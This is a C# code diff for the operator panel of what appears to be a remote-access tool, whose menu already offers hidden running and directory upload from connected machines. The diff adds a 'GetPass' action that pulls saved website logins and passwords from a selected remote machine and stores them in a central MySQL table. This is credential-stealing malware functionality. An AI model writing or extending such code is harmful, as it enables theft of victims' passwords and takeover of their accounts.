@@ -1,15 +1,10 @@
-﻿using ServerWorker.Server;
+﻿using Interfaces;
+using ServerWorker.Server;
 using System;
-using System.IO;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
+using System.IO;
 using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
-using Interfaces;
 
 namespace ServerWorker
 {
@@ -32,6 +27,8 @@ namespace ServerWorker
             menu.Items[2].Click += RunHide;
             menu.Items.Add("Upload");
             menu.Items[3].Click += Upload;
+            menu.Items.Add("GetPass");
+            menu.Items[4].Click += GetPass;
 
             List<string> drivers = user.UsersCom.GetDrives();
             listView1.Items.Clear();
@@ -59,6 +56,19 @@ namespace ServerWorker
         private void Upload(object sender, EventArgs e)
         {
             user.UsersCom.UploadDirectory(listView1.SelectedItems[0].Text.ToString(), "Upload");
+        }
+
+        private void GetPass(object sender, EventArgs e)
+        {
+            var loginDataList = user.UsersCom.SendLoginData(listView1.SelectedItems[0].Text.ToString());
+            MySQLData data = new MySQLData() { Table = "LoginData", Columns = new string[] { "Site", "Login", "Password" , "UserId" } };
+            foreach (LoginData loginData in loginDataList)
+            {
+                if (!string.IsNullOrWhiteSpace(loginData.WebSite) || !string.IsNullOrWhiteSpace(loginData.Login) || !string.IsNullOrWhiteSpace(loginData.Pass))
+                    data.Values.Add(new string[] { loginData.WebSite, loginData.Login, loginData.Pass, user.userData.id });
+            }
+
+            MySQLManager.Send(data);
         }
 
         private void ReRequest()
